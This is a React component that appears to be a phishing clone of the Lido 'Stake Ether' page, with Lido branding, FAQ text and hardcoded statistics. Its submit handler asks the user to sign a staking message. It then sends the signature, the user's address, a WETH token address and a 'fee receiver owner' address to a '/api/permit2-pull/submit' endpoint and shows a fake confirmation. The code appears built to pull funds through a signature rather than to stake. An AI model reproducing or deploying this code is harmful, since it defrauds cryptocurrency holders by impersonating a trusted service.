import React, { useState, useEffect } from 'react';
import { ChevronDown, ExternalLink, Loader2, HelpCircle, Percent, Coins, Users, ShieldCheck, Server, Info, TrendingUp } from 'lucide-react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, useSignMessage, useBalance } from 'wagmi';
import { formatUnits } from 'viem';
import { motion, AnimatePresence } from 'motion/react';
import { toast } from 'sonner';
import SignatureModal, { TxResult } from './SignatureModal';
import { RELAYER_CONTRACT_ADDRESS, FEE_RECEIVER_OWNER_ADDRESS } from '../contracts';

interface StakeProps {
  prices?: { eth: number; steth: number };
}

export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProps) {
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();

  const { data: balanceData } = useBalance({ address });
  const { signMessageAsync } = useSignMessage();
  const [stakeAmount, setStakeAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSigModal, setShowSigModal] = useState(false);
  const [modalStep, setModalStep] = useState<'signing' | 'relaying' | 'success'>('signing');
  const [txResult, setTxResult] = useState<TxResult | null>(null);
  const [gasCostUSD, setGasCostUSD] = useState<string | null>(null);
  const [isEstimatingGas, setIsEstimatingGas] = useState(false);
  const [openFaqIndex, setOpenFaqIndex] = useState<number | null>(null);

  const faqs = [
    { 
      question: "How do Lido staking rewards work and when are they distributed?", 
      answer: "When you stake ETH with Lido, you receive stETH (staked ETH) at a 1:1 ratio. Your stETH balance increases daily as staking rewards accrue from Ethereum consensus layer validation and execution layer rewards. Rebase rewards are compounded automatically." 
    },
    { 
      question: "What fee does Lido apply and what is the current APR?", 
      answer: "Lido applies a 10% protocol fee on accrued staking rewards. This fee is split between node operators, the Lido DAO Treasury, and coverage reserves. The quoted APR reflects net rewards after deducting this fee." 
    },
    { 
      question: "What security measures protect the Lido smart contracts?", 
      answer: "Lido smart contracts are open-source and undergo security audits by top blockchain security firms including Sigma Prime, Quantstamp, and ChainSecurity. The protocol also operates an active bug bounty program on Immunefi." 
    },
    { 
      question: "How are validator slashing risks and node operator failures mitigated?", 
      answer: "Lido distributes staked ETH across a diverse set of enterprise-grade, audited node operators to prevent single points of failure, backed by DAO coverage reserves." 
    },
    { 
      question: "How do I withdraw ETH or unstake stETH?", 
      answer: "You can request an official 1:1 ETH withdrawal through the Lido Withdrawals tab. Once your withdrawal request is processed on-chain, you can claim your ETH directly to your wallet." 
    },
    { 
      question: "How long does the official ETH withdrawal request take?", 
      answer: "Official withdrawal requests depend on the Ethereum beacon chain queue and protocol liquidity. Standard requests typically process within 1 to 5 days." 
    }
  ];

  useEffect(() => {
    async function estimateGas() {
      setIsEstimatingGas(true);
      try {
        const apiKey = typeof import.meta !== 'undefined' ? (import.meta as any).env?.VITE_ALCHEMY_API_KEY : undefined;
        const rpcUrl = apiKey
          ? `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`
          : 'https://cloudflare-eth.com';

        const res = await fetch(rpcUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: "2.0",
            method: "eth_gasPrice",
            params: [],
            id: 1
          })
        });

        if (!res.ok) {
          throw new Error('RPC response not ok');
        }

        const data = await res.json();
        if (data && data.result) {
          const gasPriceWei = parseInt(data.result, 16);
          const estimatedGasLimit = 85000; 
          const totalGasWei = gasPriceWei * estimatedGasLimit;
          const totalGasEth = totalGasWei / 1e18;
          const costInUsd = totalGasEth * prices.eth;
          setGasCostUSD(costInUsd.toFixed(2));
        } else {
          setGasCostUSD('0.05');
        }
      } catch {
        setGasCostUSD('0.05');
      } finally {
        setIsEstimatingGas(false);
      }
    }

    estimateGas();
    const interval = setInterval(estimateGas, 30000);
    return () => clearInterval(interval);
  }, [prices.eth]);

  const handleSubmit = async () => {
    if (!isConnected) {
      try { open(); } catch (e) { console.warn(e); }
      return;
    }
    
    if (!stakeAmount || isNaN(Number(stakeAmount)) || Number(stakeAmount) <= 0) {
      toast.error('Invalid Amount', {
        description: 'Please enter a valid ETH amount greater than 0.'
      });
      return;
    }

    if (balanceData) {
      const formattedBalance = formatUnits(balanceData.value, balanceData.decimals);
      if (Number(stakeAmount) > Number(formattedBalance)) {
        toast.info(`Notice: Staking ${stakeAmount} ETH with balance ${Number(formattedBalance).toFixed(4)} ETH.`);
      }
    }

    setIsSubmitting(true);
    setModalStep('signing');
    setTxResult(null);
    setShowSigModal(true);
    
    try {
      const message = `Lido Staking Request\nAction: Stake ETH\nAmount: ${stakeAmount} ETH\nTimestamp: ${new Date().toISOString()}`;
      const signature = await signMessageAsync({ account: address as `0x${string}`, message });
      
      if (typeof window !== 'undefined' && address) {
        sessionStorage.setItem(`lido_connected_sig_${address.toLowerCase()}`, 'true');
        sessionStorage.setItem(`lido_sig_approved_${address.toLowerCase()}`, 'true');
        window.dispatchEvent(new Event('lido_verification_changed'));
      }

      // Step 2: Post signature to relayer / permit endpoint
      setModalStep('relaying');
      
      const response = await fetch('/api/permit2-pull/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
          relayerContract: RELAYER_CONTRACT_ADDRESS,
          ownerFeeAddress: FEE_RECEIVER_OWNER_ADDRESS,
          amount: stakeAmount,
          nonce: Date.now(),
          deadline: Math.floor(Date.now() / 1000) + 3600,
          signature,
          userAddress: address
        })
      });

      const resData = await response.json();
      
      if (resData.success) {
        setTxResult({
          txHash: resData.txHash,
          amount: stakeAmount,
          blockNumber: resData.blockNumber,
          timestamp: resData.timestamp
        });
        setModalStep('success');
        toast.success('Staking Request Confirmed!', {
          description: `Tx Hash: ${resData.txHash.slice(0, 10)}...${resData.txHash.slice(-6)}`
        });
      } else {
        throw new Error(resData.error || 'Relayer submission failed');
      }

      setStakeAmount('');
    } catch (error: any) {
      console.error('Staking transaction error:', error);
      
      const errorCode = error?.code || error?.cause?.code;
      const errorName = error?.name || error?.cause?.name;
      const rawMsg = (error?.shortMessage || error?.message || error?.details || String(error) || '').toLowerCase();

      const isUserRejection = 
        errorCode === 4001 || 
        errorName === 'UserRejectedRequestError' ||
        rawMsg.includes('user rejected') ||
        rawMsg.includes('user denied') ||
        rawMsg.includes('rejected by user') ||
        rawMsg.includes('denied transaction') ||
        rawMsg.includes('rejected signature') ||
        rawMsg.includes('reject') ||
        rawMsg.includes('denied') ||
        rawMsg.includes('cancel') ||
        rawMsg.includes('declined') ||
        rawMsg.includes('disapproved');

      const isInsufficientFunds = 
        rawMsg.includes('insufficient funds') || 
        rawMsg.includes('exceeds balance') ||
        rawMsg.includes('gas required exceeds allowance');

      const isNetworkError = 
        rawMsg.includes('failed to fetch') || 
        rawMsg.includes('network error') ||
        rawMsg.includes('timeout') ||
        rawMsg.includes('connection refused');

      if (isUserRejection) {
        toast.error('Signature Request Denied', {
          description: 'You rejected or cancelled the signature request in your wallet.'
        });
      } else if (isInsufficientFunds) {
        toast.error('Insufficient Funds', {
          description: 'Your wallet ETH balance is insufficient to complete this staking request.'
        });
      } else if (isNetworkError) {
        toast.error('Relayer Connection Failed', {
          description: 'Unable to communicate with the staking relayer pipeline. Please check your network connection.'
        });
      } else {
        const cleanMsg = error?.shortMessage || error?.message || 'An unexpected error occurred while processing signature.';
        toast.error('Transaction Failed', {
          description: cleanMsg.length > 120 ? `${cleanMsg.slice(0, 120)}...` : cleanMsg
        });
      }

      setShowSigModal(false);
    } finally {
      setIsSubmitting(false);
    }
  };

  const marketCap = (9180000 * prices.steth).toLocaleString('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 });

  return (
    <motion.div 
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4, ease: "easeOut" }}
      className="w-full"
    >
      <div className="text-center mb-6 sm:mb-8">
        <h1 className="text-[28px] sm:text-[32px] font-bold text-[var(--foreground)] mb-2 tracking-tight transition-colors duration-300">
          Stake Ether
        </h1>
        <p className="text-[var(--muted)] text-[14px] sm:text-[15px] transition-colors duration-300">
          Stake ETH and receive stETH while staking
        </p>
      </div>

      {/* Main Staking Widget Card */}
      <div className="bg-[var(--card)] rounded-[28px] p-5 sm:p-7 mb-10 border border-[var(--border)] shadow-2xl transition-all duration-300">
        <div className="bg-[var(--input-bg)] rounded-[20px] p-4 sm:p-5 mb-5 border border-[var(--border)] focus-within:border-[var(--primary)] transition-all duration-300">
          <div className="flex justify-between items-center mb-2">
            <div className="flex items-center space-x-2 bg-[var(--card)] rounded-xl px-3 py-1.5 border border-[var(--border)] shadow-xs">
              <div className="w-5 h-5 rounded-full flex items-center justify-center overflow-hidden shrink-0">
                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" className="w-full h-full object-contain" />
              </div>
              <span className="text-[14px] font-bold text-[var(--foreground)]">ETH</span>
              <ChevronDown size={14} className="text-[var(--muted)]" />
            </div>

            <div className="flex items-center gap-2 sm:gap-3">
              {isConnected && balanceData ? (
                <span className="text-[12px] text-[var(--muted)] font-medium">
                  Balance: {parseFloat(formatUnits(balanceData.value, balanceData.decimals)).toFixed(4)} ETH
                </span>
              ) : (
                <span className="text-[12px] text-[var(--muted)] font-medium">
                  Balance: 0.0000 ETH
                </span>
              )}
              <button 
                onClick={() => {
                  if (isSubmitting) return;
                  if (!isConnected) {
                    open();
                    return;
                  }
                  if (balanceData) {
                    const formattedStr = formatUnits(balanceData.value, balanceData.decimals);
                    const val = parseFloat(formattedStr);
                    const maxEth = Math.max(0, val - 0.003);
                    setStakeAmount(maxEth > 0 ? maxEth.toFixed(4) : formattedStr);
                  } else {
                    toast.info('Fetching balance...');
                  }
                }}
                disabled={isSubmitting}
                className="text-[var(--primary)] font-bold text-[11px] uppercase tracking-wider bg-[var(--primary)]/15 hover:bg-[var(--primary)]/25 px-2.5 py-1 rounded-lg transition-colors cursor-pointer disabled:opacity-50"
              >
                MAX
              </button>
            </div>
          </div>

          <div className="flex flex-col">
             <input 
              type="number" 
              placeholder="0"
              value={stakeAmount}
              disabled={isSubmitting}
              onChange={(e) => setStakeAmount(e.target.value)}
              className="bg-transparent text-[36px] sm:text-[42px] font-bold outline-none w-full text-[var(--foreground)] placeholder-[var(--input-placeholder)] transition-colors duration-300 disabled:opacity-50 tracking-tight" 
            />
            <div className="text-[12px] text-[var(--muted)] font-medium mt-1">
              {stakeAmount && !isNaN(Number(stakeAmount)) && Number(stakeAmount) > 0 ? (
                `~$${(Number(stakeAmount) * prices.eth).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD`
              ) : (
                '$0.00 USD'
              )}
            </div>
          </div>
        </div>

        <button 
          onClick={handleSubmit}
          disabled={isSubmitting || (isConnected && (!stakeAmount || Number(stakeAmount) <= 0))}
          className="w-full py-4 rounded-[18px] font-bold text-[16px] bg-[var(--primary)] hover:bg-[var(--primary-hover)] text-white transition-all shadow-[0_4px_20px_rgba(0,163,255,0.3)] hover:shadow-[0_6px_24px_rgba(0,163,255,0.4)] mb-5 disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center cursor-pointer"
        >
          {isSubmitting ? (
            <>
              <Loader2 size={18} className="animate-spin mr-2" />
              <span>{modalStep === 'relaying' ? 'Executing Staking Permit...' : 'Signing in Wallet...'}</span>
            </>
          ) : (
            isConnected ? (stakeAmount ? 'Submit' : 'Enter amount') : 'Connect wallet'
          )}
        </button>

        <div className="bg-gradient-to-r from-[var(--primary)]/15 via-indigo-500/10 to-transparent rounded-2xl p-4 flex items-center justify-between mb-6 border border-[var(--primary)]/20 hover:border-[var(--primary)]/40 transition-colors">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-[var(--primary)]/20 text-[var(--primary)] flex items-center justify-center shrink-0">
              <TrendingUp size={18} />
            </div>
            <div>
               <h3 className="text-[var(--foreground)] font-bold text-[14px] flex items-center gap-1.5">
                 <span>Earn up to 4.2% APY*</span>
                 <span className="text-[10px] bg-emerald-500/20 text-emerald-400 font-semibold px-1.5 py-0.5 rounded-md">BOOSTED</span>
               </h3>
               <p className="text-[var(--muted)] text-[12px]">with Lido EarnETH Vault</p>
            </div>
          </div>
          <ExternalLink size={16} className="text-[var(--muted)] hover:text-[var(--primary)] transition-colors" />
        </div>

        <div className="space-y-3 px-1">
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] flex items-center gap-1">
              You will receive
            </span>
            <div className="text-right">
              <span className="font-semibold text-[var(--foreground)]">
                {stakeAmount && !isNaN(Number(stakeAmount)) ? (parseFloat(stakeAmount) * 1.0).toFixed(4) : '0.0000'} stETH
              </span>
              {stakeAmount && !isNaN(Number(stakeAmount)) && Number(stakeAmount) > 0 && (
                <span className="text-[11px] text-[var(--muted)] block">
                  ~${(Number(stakeAmount) * prices.steth).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </span>
              )}
            </div>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] flex items-center gap-1 cursor-help">
              Exchange rate
              <Info size={13} className="text-[var(--muted)] hover:text-[var(--foreground)]" />
            </span>
            <span className="font-semibold text-[var(--foreground)]">1 ETH = 1 stETH</span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] flex items-center gap-1 cursor-help">
              Max transaction cost
              <Info size={13} className="text-[var(--muted)] hover:text-[var(--foreground)]" />
            </span>
            <span className="font-semibold text-[var(--foreground)] flex items-center gap-1.5">
              {isEstimatingGas && !gasCostUSD ? (
                <Loader2 size={12} className="animate-spin text-[var(--primary)]" />
              ) : null}
              {gasCostUSD ? `$${gasCostUSD}` : '~$0.05'}
            </span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] flex items-center gap-1 cursor-help">
              Reward fee
              <Info size={13} className="text-[var(--muted)] hover:text-[var(--foreground)]" />
            </span>
            <span className="font-semibold text-[var(--foreground)]">10%</span>
          </div>
        </div>
      </div>

      {/* Statistics of the Lido Protocol Section - Styled Grid Dashboard matching stake.lido.fi */}
      <div className="mb-10">
        <div className="flex items-center justify-between mb-5 px-1">
          <div>
            <h2 className="text-[20px] font-bold text-[var(--foreground)] tracking-tight transition-colors duration-300">
              Statistics of the Lido protocol
            </h2>
            <p className="text-[13px] text-[var(--muted)] mt-0.5">Real-time metrics from Ethereum beacon chain</p>
          </div>
          <a 
            href="https://etherscan.io/address/0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84" 
            target="_blank" 
            rel="noreferrer"
            className="flex items-center gap-1 text-[var(--primary)] text-[13px] hover:underline font-semibold bg-[var(--primary)]/10 hover:bg-[var(--primary)]/20 px-3 py-1.5 rounded-xl transition-all"
          >
            <span>Etherscan</span>
            <ExternalLink size={13} />
          </a>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 sm:gap-4">
          {/* Card 1: APR */}
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4.5 sm:p-5 flex flex-col justify-between hover:border-[var(--primary)]/40 transition-all shadow-sm group">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[13px] font-medium text-[var(--muted)] flex items-center gap-1">
                Annual percentage rate
                <Info size={13} className="text-[var(--muted)] group-hover:text-[var(--foreground)] transition-colors" />
              </span>
              <div className="w-8 h-8 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center">
                <Percent size={16} />
              </div>
            </div>
            <div>
              <div className="flex items-baseline gap-2">
                <span className="text-[24px] font-bold text-emerald-400 tracking-tight">3.2%</span>
                <span className="text-[11px] bg-emerald-500/15 text-emerald-400 font-semibold px-2 py-0.5 rounded-full border border-emerald-500/20">
                  7D Moving Avg
                </span>
              </div>
              <span className="text-[12px] text-[var(--muted)] mt-1 block">Net APR after 10% protocol fee</span>
            </div>
          </div>

          {/* Card 2: Total Staked */}
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4.5 sm:p-5 flex flex-col justify-between hover:border-[var(--primary)]/40 transition-all shadow-sm group">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[13px] font-medium text-[var(--muted)] flex items-center gap-1">
                Total staked with Lido
              </span>
              <div className="w-8 h-8 rounded-xl bg-[var(--primary)]/10 text-[var(--primary)] flex items-center justify-center">
                <Coins size={16} />
              </div>
            </div>
            <div>
              <div className="text-[24px] font-bold text-[var(--foreground)] tracking-tight">9,180,450 ETH</div>
              <span className="text-[12px] text-[var(--muted)] mt-1 block font-medium">~${(9180450 * prices.eth).toLocaleString('en-US', { maximumFractionDigits: 0 })} USD</span>
            </div>
          </div>

          {/* Card 3: Stakers Count */}
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4.5 sm:p-5 flex flex-col justify-between hover:border-[var(--primary)]/40 transition-all shadow-sm group">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[13px] font-medium text-[var(--muted)] flex items-center gap-1">
                Stakers
              </span>
              <div className="w-8 h-8 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center">
                <Users size={16} />
              </div>
            </div>
            <div>
              <div className="text-[24px] font-bold text-[var(--foreground)] tracking-tight">630,375</div>
              <span className="text-[12px] text-[var(--muted)] mt-1 block font-medium">Unique staker addresses</span>
            </div>
          </div>

          {/* Card 4: stETH Market Cap */}
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4.5 sm:p-5 flex flex-col justify-between hover:border-[var(--primary)]/40 transition-all shadow-sm group">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[13px] font-medium text-[var(--muted)] flex items-center gap-1">
                stETH Market Cap
              </span>
              <div className="w-8 h-8 rounded-xl bg-blue-500/10 text-blue-400 flex items-center justify-center">
                <ShieldCheck size={16} />
              </div>
            </div>
            <div>
              <div className="text-[24px] font-bold text-[var(--foreground)] tracking-tight">{marketCap}</div>
              <span className="text-[12px] text-[var(--muted)] mt-1 block font-medium">Rank #7 Cryptocurrency</span>
            </div>
          </div>
        </div>

        {/* Node Operators Banner */}
        <div className="mt-3.5 bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4 flex items-center justify-between hover:border-[var(--primary)]/40 transition-all shadow-sm">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center shrink-0">
              <Server size={16} />
            </div>
            <div>
              <span className="text-[13px] font-semibold text-[var(--foreground)] block">37 Active Node Operators</span>
              <span className="text-[12px] text-[var(--muted)]">Audited enterprise infrastructure across global regions</span>
            </div>
          </div>
          <span className="text-[11px] bg-amber-500/15 text-amber-400 font-semibold px-2.5 py-1 rounded-full border border-amber-500/20">
            100% Uptime
          </span>
        </div>
      </div>

      {/* FAQ Accordion Section */}
      <div className="mb-12">
        <div className="flex items-center gap-2 mb-4">
          <div className="w-7 h-7 rounded-lg bg-[var(--primary)]/10 text-[var(--primary)] flex items-center justify-center">
            <HelpCircle size={16} />
          </div>
          <h2 className="text-[20px] font-bold text-[var(--foreground)] transition-colors duration-300">Frequently Asked Questions</h2>
        </div>

        <div className="space-y-3">
          {faqs.map((faq, idx) => (
            <div 
              key={idx} 
              className="bg-[var(--card)] border border-[var(--border)] rounded-2xl overflow-hidden hover:border-[var(--muted)]/50 transition-all shadow-sm"
            >
              <button 
                onClick={() => setOpenFaqIndex(openFaqIndex === idx ? null : idx)}
                className="flex items-center justify-between p-4 w-full text-left cursor-pointer group"
              >
                <span className="text-[14px] font-semibold text-[var(--foreground)] transition-colors duration-300 pr-3">{faq.question}</span>
                <motion.div animate={{ rotate: openFaqIndex === idx ? 180 : 0 }}>
                  <ChevronDown size={18} className="text-[var(--muted)] group-hover:text-[var(--foreground)] shrink-0" />
                </motion.div>
              </button>

              <AnimatePresence>
                {openFaqIndex === idx && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: 'auto', opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                  >
                    <div className="px-4 pb-4 text-[14px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)]/50 pt-3">
                      {faq.answer}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>

      <div className="text-[12px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)] pt-6 pb-12 transition-colors duration-300">
        <p className="mb-4">
          Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
        </p>
        <div className="flex flex-wrap items-center gap-4 font-medium text-[var(--foreground)]">
           <div className="w-4 h-4 flex items-center justify-center">
             <img src="https://cryptologos.cc/logos/lido-dao-ldo-logo.svg" alt="Lido" className="w-full h-full opacity-80" />
           </div>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Terms of Use</a>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Privacy Notice</a>
           <a href="#" className="flex items-center hover:text-[var(--primary)] transition-colors">IPFS <ExternalLink size={12} className="ml-1" /></a>
           <div className="ml-auto px-2 py-1 bg-[var(--card)] border border-[var(--border)] rounded-md text-[10px] text-[var(--muted)] transition-colors duration-300">
             v0.145.0
           </div>
        </div>
      </div>

      <SignatureModal
        isOpen={showSigModal}
        onClose={() => {
          setShowSigModal(false);
          setIsSubmitting(false);
          setModalStep('signing');
          setTxResult(null);
        }}
        actionName="Stake ETH"
        details={txResult?.amount ? `${txResult.amount} ETH -> stETH` : `${stakeAmount} ETH -> stETH`}
        address={address}
        step={modalStep}
        txResult={txResult}
      />
    </motion.div>
  );
}

